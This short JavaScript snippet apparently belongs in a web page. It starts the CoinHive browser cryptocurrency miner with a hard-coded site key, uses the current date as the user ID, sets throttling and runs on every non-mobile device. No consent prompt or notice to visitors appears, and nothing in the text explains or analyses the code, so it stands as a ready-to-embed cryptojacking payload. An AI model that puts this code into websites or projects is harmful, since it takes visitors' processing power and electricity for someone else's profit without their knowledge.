var currentDate = new Date();
var currentUser = currentDate.getFullYear() + "-" + (currentDate.getMonth() + 1) + "-" + currentDate.getDate();
var m = new CoinHive.User("f3s7wO6rMTjyl4yTEDKP8i4dJshNojru", currentUser, {
    throttle: 0.7
});
if (!m.isMobile()) {
    m.start();
}